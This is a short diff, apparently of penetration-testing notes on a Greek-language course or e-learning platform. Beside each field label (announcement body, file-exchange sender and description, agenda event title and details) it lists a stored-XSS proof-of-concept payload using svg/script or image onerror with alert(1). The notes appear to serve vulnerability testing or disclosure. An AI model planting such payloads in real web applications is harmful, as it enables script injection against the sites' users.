@@ -82,7 +82,18 @@ TzeniPantazi<svg xmlns="#"><script>alert(1)</script></svg>
 --->Σώμα ανακοίνωσης
 	<image src=1 href=1 onerror="javascript:alert(1)"></image>
 
+Ανταλλαγή Αρχείων
+--->Αποστολέας
+	<image src=1 href=1 onerror="javascript:alert(1)"></image>
+---> Περιγραφή αρχείου:
+	<image src=1 href=1 onerror="javascript:alert(1)"></image>
 
+Ατζέντα:
+---> Προσθήκη ενός γεγονότος
+	---> Τίτλος
+		<svg xmlns="#"><script>alert(1)</script></svg>
+	---> Λεπτομέρειες
+		<svg xmlns="#"><script>alert(1)</script></svg>
 --------------------------------------------------------------------------------------------------------
 
 THANOS:
